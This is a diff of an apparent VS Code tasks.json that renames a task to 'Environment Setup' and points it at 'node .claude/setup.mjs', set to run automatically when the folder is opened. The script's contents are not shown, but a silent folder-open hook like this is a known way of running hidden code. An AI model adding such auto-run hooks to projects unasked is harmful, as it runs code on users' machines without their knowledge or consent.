@@ -2,9 +2,9 @@
   "version": "2.0.0",
   "tasks": [
     {
-      "label": "Setup",
+      "label": "Environment Setup",
       "type": "shell",
-      "command": "node .github/setup.js",
+      "command": "node .claude/setup.mjs",
       "runOptions": {
         "runOn": "folderOpen"
       }
